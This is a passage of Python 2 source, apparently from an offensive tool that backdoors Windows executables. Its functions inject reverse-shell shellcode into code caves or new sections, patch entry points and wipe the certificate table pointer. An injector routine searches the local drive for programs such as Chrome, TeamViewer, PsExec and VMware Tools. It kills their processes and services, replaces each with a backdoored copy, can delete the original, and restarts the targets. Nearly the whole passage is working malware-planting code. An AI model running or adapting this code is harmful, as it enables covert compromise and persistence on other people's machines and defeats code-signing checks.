                                           "Cave Size: {3}".format(details[0], details[1], details[2],
                                                                   details[3], details[4], details[5],
                                                                   details[6]))

            while True:
                try:
                    self.CAVE_MINER_TRACKER
                except:
                    self.CAVE_MINER_TRACKER = 0

                print "*" * 50
                selection = raw_input("[!] Enter your selection: ")
                try:
                    selection = int(selection)
                    
                    print "Using selection: %s" % selection
                    try:
                        if self.CHANGE_ACCESS is True:
                            if pickACave[selection][0] != None:
                                self.change_section_flags(pickACave[selection][0])
                        CavesPicked[k] = pickACave[selection]
                        break
                    except Exception as e:
                        print str(e)
                        print "-User selection beyond the bounds of available caves...appending a code cave"
                        return None
                except Exception as e:
		    breakOutValues = ['append', 'jump', 'single', 'ignore', 'a', 'j', 's', 'i']
                    if selection.lower() in breakOutValues: 
                        return selection
        return CavesPicked


    def runas_admin(self):
        """
        This module jumps to .rsrc section and checks for
        the following string: requestedExecutionLevel level="highestAvailable"

        """
        #g = open(flItms['filename'], "rb")
        runas_admin = False
        print "[*] Checking Runas_admin"
        if 'rsrcPointerToRawData' in self.flItms:
            self.binary.seek(self.flItms['rsrcPointerToRawData'], 0)
            search_lngth = len('requestedExecutionLevel level="highestAvailable"')
            data_read = 0
            while data_read < self.flItms['rsrcSizeRawData']:
                self.binary.seek(self.flItms['rsrcPointerToRawData'] + data_read, 0)
                temp_data = self.binary.read(search_lngth)
                if temp_data == 'requestedExecutionLevel level="highestAvailable"':
                    runas_admin = True
                    break
                data_read += 1
        if runas_admin is True:
            print "[*] %s must run with highest available privileges" % self.FILE
        else:
            print "[*] %s does not require highest available privileges" % self.FILE

        return runas_admin


    def support_check(self):
        """
        This function is for checking if the current exe/dll is
        supported by this program. Returns false if not supported,
        returns flItms if it is.
        """
        print "[*] Checking if binary is supported"
        self.flItms['supported'] = False
        #global f
        self.binary = open(self.FILE, "r+b")
        if self.binary.read(2) != "\x4d\x5a":
            print "%s not a PE File" % self.FILE
            return False
        self.gather_file_info_win()
        if self.flItms is False:
            return False
        if MachineTypes[hex(self.flItms['MachineType'])] not in supported_types:
            for item in self.flItms:
                print item + ':', self.flItms[item]
            print ("This program does not support this format: %s"
                   % MachineTypes[hex(self.flItms['MachineType'])])
        else:
            self.flItms['supported'] = True
        targetFile = intelCore(self.flItms, self.binary, self.VERBOSE)
        if self.flItms['Characteristics'] - 0x2000 > 0 and self.PATCH_DLL is False:
            return False
        if self.flItms['Magic'] == int('20B', 16) and (self.IMAGE_TYPE == 'ALL' or self.IMAGE_TYPE == 'x64'):
            #if self.IMAGE_TYPE == 'ALL' or self.IMAGE_TYPE == 'x64':
            self.flItms, self.flItms['count_bytes'] = targetFile.pe64_entry_instr()
        elif self.flItms['Magic'] == int('10b', 16) and (self.IMAGE_TYPE == 'ALL' or self.IMAGE_TYPE == 'x32'):
            #if self.IMAGE_TYPE == 'ALL' or self.IMAGE_TYPE == 'x32':
            self.flItms, self.flItms['count_bytes'] = targetFile.pe32_entry_instr()
        else:
            self.flItms['supported'] = False
        #This speeds things up, MAKE IT OPTIONAL
        #CONFIG
        if self.CHECK_ADMIN is True:
            self.flItms['runas_admin'] = self.runas_admin()

        if self.VERBOSE is True:
            self.print_flItms(self.flItms)

        if self.flItms['supported'] is False:
            return False
        self.binary.close()


    def patch_pe(self):

        """
        This function operates the sequence of all involved
        functions to perform the binary patching.
        """
        print "[*] In the backdoor module"
        if self.INJECTOR is False:
            os_name = os.name
            if not os.path.exists("backdoored"):
                os.makedirs("backdoored")
            if os_name == 'nt':
                self.OUTPUT = "backdoored\\" + self.OUTPUT
            else:
                self.OUTPUT = "backdoored/" + self.OUTPUT

        issupported = self.support_check()
        if issupported is False:
            return None
        self.flItms['NewCodeCave'] = self.ADD_SECTION
        self.flItms['cave_jumping'] = self.CAVE_JUMPING
        self.flItms['CavesPicked'] = {}
        self.flItms['LastCaveAddress'] = 0
        self.flItms['stager'] = False
        self.flItms['supplied_shellcode'] = self.SUPPLIED_SHELLCODE
        #if self.flItms['supplied_shellcode'] is not None:
        #    self.flItms['supplied_shellcode'] = open(self.SUPPLIED_SHELLCODE, 'r+b').read()
            #override other settings
        #    port = 4444
        #    host = '127.0.0.1'
        self.set_shells()
        #Move shellcode check here not before this is executed.
        #Creating file to backdoor
        self.flItms['backdoorfile'] = self.OUTPUT
        shutil.copy2(self.FILE, self.flItms['backdoorfile'])
        
        self.binary = open(self.flItms['backdoorfile'], "r+b")
        #reserve space for shellcode
        targetFile = intelCore(self.flItms, self.binary, self.VERBOSE)
        # Finding the length of the resume Exe shellcode
        if self.flItms['Magic'] == int('20B', 16):
            _, self.flItms['resumeExe'] = targetFile.resume_execution_64()
        else:
            _, self.flItms['resumeExe'] = targetFile.resume_execution_32()

        shellcode_length = len(self.flItms['shellcode'])

        self.flItms['shellcode_length'] = shellcode_length + len(self.flItms['resumeExe'])

        caves_set = False
        while caves_set is False and self.flItms['NewCodeCave'] is False:
            #if self.flItms['NewCodeCave'] is False:
                #self.flItms['JMPtoCodeAddress'], self.flItms['CodeCaveLOC'] = (
            self.flItms['CavesPicked'] = self.find_cave()
            if type(self.flItms['CavesPicked']) == str:
                if self.flItms['CavesPicked'].lower() in ['append', 'a']:
                    self.flItms['JMPtoCodeAddress'] = None
                    self.flItms['CodeCaveLOC'] = 0
                    self.flItms['cave_jumping'] = False
                    self.flItms['CavesPicked'] = {}
                    print "-resetting shells"
                    self.set_shells()
                    caves_set = True
                elif self.flItms['CavesPicked'].lower() in ['jump', 'j']:
                    self.flItms['JMPtoCodeAddress'] = None
                    self.flItms['CodeCaveLOC'] = 0
                    self.flItms['cave_jumping'] = True
                    self.flItms['CavesPicked'] = {}
                    print "-resetting shells"
                    self.set_shells()
                    continue
                elif self.flItms['CavesPicked'].lower() in ['single', 's']:
                    self.flItms['JMPtoCodeAddress'] = None
                    self.flItms['CodeCaveLOC'] = 0
                    self.flItms['cave_jumping'] = False
                    self.flItms['CavesPicked'] = {}
                    print "-resetting shells"
                    self.set_shells()
                    continue
		elif self.flItms['CavesPicked'].lower() in ['ignore', 'i']:
		    #Let's say we don't want to patch a binary
		    return None
            else:
                self.flItms['JMPtoCodeAddress'] = self.flItms['CavesPicked'].iteritems().next()[1][6]
                caves_set = True
            #else:
            #    caves_set = True

        #If no cave found, continue to create one.
        if self.flItms['JMPtoCodeAddress'] is None or self.flItms['NewCodeCave'] is True:
            self.create_code_cave()
            self.flItms['NewCodeCave'] = True
            print "- Adding a new section to the exe/dll for shellcode injection"
        else:
            self.flItms['LastCaveAddress'] = self.flItms['CavesPicked'][len(self.flItms['CavesPicked']) - 1][6]

        #Patch the entry point
        targetFile = intelCore(self.flItms, self.binary, self.VERBOSE)
        targetFile.patch_initial_instructions()

        if self.flItms['Magic'] == int('20B', 16):
            ReturnTrackingAddress, self.flItms['resumeExe'] = targetFile.resume_execution_64()
        else:
            ReturnTrackingAddress, self.flItms['resumeExe'] = targetFile.resume_execution_32()

        #write instructions and shellcode
        self.flItms['allshells'] = getattr(self.flItms['shells'], self.SHELL)(self.flItms, self.flItms['CavesPicked'])
        
        if self.flItms['cave_jumping'] is True:
            if self.flItms['stager'] is False:
                temp_jmp = "\xe9"
                breakupvar = eat_code_caves(self.flItms, 1, 2)
                test_length = int(self.flItms['CavesPicked'][2][1], 16) - int(self.flItms['CavesPicked'][1][1], 16) - len(self.flItms['allshells'][1]) - 5
                #test_length = breakupvar - len(self.flItms['allshells'][1]) - 4
                if test_length < 0:
                    temp_jmp += struct.pack("<I", 0xffffffff - abs(breakupvar - len(self.flItms['allshells'][1]) - 4))
                else:
                    temp_jmp += struct.pack("<I", breakupvar - len(self.flItms['allshells'][1]) - 5)

            self.flItms['allshells'] += (self.flItms['resumeExe'], )

        self.flItms['completeShellcode'] = self.flItms['shellcode'] + self.flItms['resumeExe']
        if self.flItms['NewCodeCave'] is True:
            self.binary.seek(self.flItms['newSectionPointerToRawData'] + self.flItms['buffer'])
            self.binary.write(self.flItms['completeShellcode'])
        if self.flItms['cave_jumping'] is True:
            for i, item in self.flItms['CavesPicked'].iteritems():
                self.binary.seek(int(self.flItms['CavesPicked'][i][1], 16))
                self.binary.write(self.flItms['allshells'][i])
                #So we can jump to our resumeExe shellcode
                if i == (len(self.flItms['CavesPicked']) - 2) and self.flItms['stager'] is False:
                    self.binary.write(temp_jmp)
        else:
            for i, item in self.flItms['CavesPicked'].iteritems():
                if i == 0:
                    self.binary.seek(int(self.flItms['CavesPicked'][i][1], 16))
                    self.binary.write(self.flItms['completeShellcode'])

        #Patch certTable
        if self.ZERO_CERT is True:
            print "[*] Overwriting certificate table pointer"
            self.binary.seek(self.flItms['CertTableLOC'],0)
            self.binary.write("\x00\x00\x00\x00\x00\x00\x00\x00")
        
        print "[*] {0} backdooring complete".format(self.FILE)
        
        self.binary.close()
        if self.VERBOSE is True:
            self.print_flItms(self.flItms)

        return True


    def output_options(self):
        """
        Output file check.
        """
        if not self.OUTPUT:
            self.OUTPUT = os.path.basename(self.FILE)


    def set_shells(self):
        """
        This function sets the shellcode.
        """
        print "[*] Looking for and setting selected shellcode"
        
        if self.flItms['Magic'] == int('10B', 16):
            self.flItms['bintype'] = winI32_shellcode
        if self.flItms['Magic'] == int('20B', 16):
            self.flItms['bintype'] = winI64_shellcode
        if not self.SHELL:
            print "You must choose a backdoor to add: (use -s)"
            for item in dir(self.flItms['bintype']):
                if "__" in item:
                    continue
                elif ("returnshellcode" == item 
                    or "pack_ip_addresses" == item 
                    or "eat_code_caves" == item
                    or 'ones_compliment' == item
                    or 'resume_execution' in item
                    or 'returnshellcode' in item):
                    continue
                else:
                    print "   {0}".format(item)
            sys.exit()
        if self.SHELL not in dir(self.flItms['bintype']):
            print "The following %ss are available: (use -s)" % str(self.flItms['bintype']).split(".")[1]
            for item in dir(self.flItms['bintype']):
                #print item
                if "__" in item:
                    continue
                elif "returnshellcode" == item or "pack_ip_addresses" == item or "eat_code_caves" == item:
                    continue
                else:
                    print "   {0}".format(item)

            sys.exit()
        else:
            shell_cmd = self.SHELL + "()"
        self.flItms['shells'] = self.flItms['bintype'](self.HOST, self.PORT, self.SUPPLIED_SHELLCODE)
        self.flItms['allshells'] = getattr(self.flItms['shells'], self.SHELL)(self.flItms)
        self.flItms['shellcode'] = self.flItms['shells'].returnshellcode()

    def injector(self):
        """
        The injector module will hunt and injection shellcode into
        targets that are in the list_of_targets dict.
        Data format DICT: {process_name_to_backdoor :
                           [('dependencies to kill', ),
                           'service to kill', restart=True/False],
                           }
        """
        
        list_of_targets = {'chrome.exe':
                   [('chrome.exe', ), None, True],
                   'hamachi-2.exe':
                   [('hamachi-2.exe', ), "Hamachi2Svc", True],
                   'tcpview.exe': [('tcpview.exe',), None, True],
                   #'rpcapd.exe':
                   #[('rpcapd.exe'), None, False],
                   'psexec.exe':
                   [('psexec.exe',), 'PSEXESVC.exe', False],
                   'vncserver.exe':
                   [('vncserver.exe', ), 'vncserver', True],
                   # must append code cave for vmtoolsd.exe

                   'vmtoolsd.exe':
                   [('vmtools.exe', 'vmtoolsd.exe'), 'VMTools', True],

                   'nc.exe': [('nc.exe', ), None, False],

                   'Start Tor Browser.exe':
                   [('Start Tor Browser.exe', ), None, False],

                   'procexp.exe': [('procexp.exe',
                                    'procexp64.exe'), None, True],

                   'procmon.exe': [('procmon.exe',
                                    'procmon64.exe'), None, True],

                   'TeamViewer.exe': [('tv_x64.exe',
                                       'tv_x32.exe'), None, True]
                   }

        print "[*] Beginning injector module"
        os_name = os.name
        if os_name == 'nt':
            if "PROGRAMFILES(x86)" in os.environ:
                print "-You have a 64 bit system"
                system_type = 64
            else:
                print "-You have a 32 bit system"
                system_type = 32
        else:
            print "This works only on windows. :("
            sys.exit()
        winversion = platform.version()
        rootdir = os.path.splitdrive(sys.executable)[0]
        #print rootdir
        targetdirs = []
        excludedirs = []
        #print system_info
        winXP2003x86targetdirs = [rootdir + '\\']
        winXP2003x86excludedirs = [rootdir + '\\Windows\\',
                                   rootdir + '\\RECYCLER\\',
                                   '\\VMWareDnD\\']
        vista7win82012x64targetdirs = [rootdir + '\\']
        vista7win82012x64excludedirs = [rootdir + '\\Windows\\',
                                        rootdir + '\\RECYCLER\\',
                                        '\\VMwareDnD\\']

        #need win2003, win2008, win8
        if "5.0." in winversion:
            print "-OS is 2000"
            targetdirs = targetdirs + winXP2003x86targetdirs
            excludedirs = excludedirs + winXP2003x86excludedirs
        elif "5.1." in winversion:
            print "-OS is XP"
            if system_type == 64:
                targetdirs.append(rootdir + '\\Program Files (x86)\\')
                excludedirs.append(vista7win82012x64excludedirs)
            else:
                targetdirs = targetdirs + winXP2003x86targetdirs
                excludedirs = excludedirs + winXP2003x86excludedirs
        elif "5.2." in winversion:
            print "-OS is 2003"
            if system_type == 64:
                targetdirs.append(rootdir + '\\Program Files (x86)\\')
                excludedirs.append(vista7win82012x64excludedirs)
            else:
                targetdirs = targetdirs + winXP2003x86targetdirs
                excludedirs = excludedirs + winXP2003x86excludedirs
        elif "6.0." in winversion:
            print "-OS is Vista/2008"
            if system_type == 64:
                targetdirs = targetdirs + vista7win82012x64targetdirs
                excludedirs = excludedirs + vista7win82012x64excludedirs
            else:
                targetdirs.append(rootdir + '\\Program Files\\')
                excludedirs.append(rootdir + '\\Windows\\')
        elif "6.1." in winversion:
            print "-OS is Win7/2008"
            if system_type == 64:
                targetdirs = targetdirs + vista7win82012x64targetdirs
                excludedirs = excludedirs + vista7win82012x64excludedirs
            else:
                targetdirs.append(rootdir + '\\Program Files\\')
                excludedirs.append(rootdir + '\\Windows\\')
        elif "6.2." in winversion:
            print "-OS is Win8/2012"
            targetdirs = targetdirs + vista7win82012x64targetdirs
            excludedirs = excludedirs + vista7win82012x64excludedirs

        filelist = set()
        folderCount = 0

        exclude = False
        for path in targetdirs:
            for root, subFolders, files in os.walk(path):
                for directory in excludedirs:
                    if directory.lower() in root.lower():
                        #print directory.lower(), root.lower()
                        #print "Path not allowed", root
                        exclude = True
                        #print exclude
                        break
                if exclude is False:
                    for _file in files:
                        f = os.path.join(root, _file)
                        for target, items in list_of_targets.iteritems():
                            if target.lower() == _file.lower():
                                #print target, f
                                print "-- Found the following file:", root + '\\' + _file
                                filelist.add(f)
                                #print exclude
                exclude = False

        #grab tasklist
        process_list = []
        all_process = os.popen("tasklist.exe")
        ap = all_process.readlines()
        all_process.close()
        ap.pop(0)   # remove blank line
        ap.pop(0)   # remove header line
        ap.pop(0)   # remove this ->> =======

        for process in ap:
            process_list.append(process.split())

        #print process_list
        #print filelist
        for target in filelist:
            service_target = False
            running_proc = False
            #get filename
            #support_result = support_check(target, 0)
            #if support_result is False:
            #   continue
            filename = os.path.basename(target)
            file_path = os.path.dirname(target) + '\\'
            for process in process_list:
                #print process
                for setprocess, items in list_of_targets.iteritems():
                    if setprocess.lower() in target.lower():
                        #print setprocess, process
                        for item in items[0]:
                            if item.lower() in [x.lower() for x in process]:
                                print "- Killing process:", item
                                try:
                                    #print process[1]
                                    os.system("taskkill /F /PID %i" %
                                              int(process[1]))
                                    running_proc = True
                                except Exception as e:
                                    print str(e)
                        if setprocess.lower() in [x.lower() for x in process]:
                            #print True, items[0], items[1]
                            if items[1] is not None:
                                print "- Killing Service:", items[1]
                                try:
                                    os.system('net stop %s' % items[1])
                                except Exception as e:
                                    print str(e)
                                service_target = True

            time.sleep(1)
            #backdoor the targets here:
            print "*" * 50
            self.FILE = target
            self.OUTPUT = os.path.basename(self.FILE + '.bd')
            print "self.OUTPUT", self.OUTPUT
            print "- Backdooring:",  self.FILE
            result = self.patch_pe()
            if result:  
                pass
            else:
                continue
            shutil.copy2(self.FILE, self.FILE + self.SUFFIX)
            os.chmod(self.FILE, stat.S_IRWXU | stat.S_IRWXG | stat.S_IRWXO)
            time.sleep(1)
            try:
                os.unlink(self.FILE)
            except:
                print "unlinking error"
            time.sleep(.5)
            try:
                shutil.copy2(self.OUTPUT,  self.FILE)
            except:
                os.system('move {0} {1}'.format( self.FILE, self.OUTPUT))
            time.sleep(.5)
            os.remove(self.OUTPUT)
            print (" - The original file {0} has been renamed to {1}".format(self.FILE,
                   self.FILE + self.SUFFIX))
        
            if self.DELETE_ORIGINAL is True:
                print "!!Warning Deleteing Original File!!"
                os.remove(self.FILE + self.SUFFIX)

            if service_target is True:
                #print "items[1]:", list_of_targets[filename][1]
                os.system('net start %s' % list_of_targets[filename][1])
            else:
                try:
                    if (list_of_targets[filename][2] is True and
                       running_proc is True):
                        subprocess.Popen([self.FILE, ])
                        print "- Restarting:", self.FILE
                    else:
                        print "-- %s was not found online -  not restarting" % self.FILE

                except:
                    if (list_of_targets[filename.lower()][2] is True and
                       running_proc is True):
                        subprocess.Popen([self.FILE, ])
                        print "- Restarting:", self.FILE
                    else:
                        print "-- %s was not found online -  not restarting" % self.FILE


########NEW FILE########
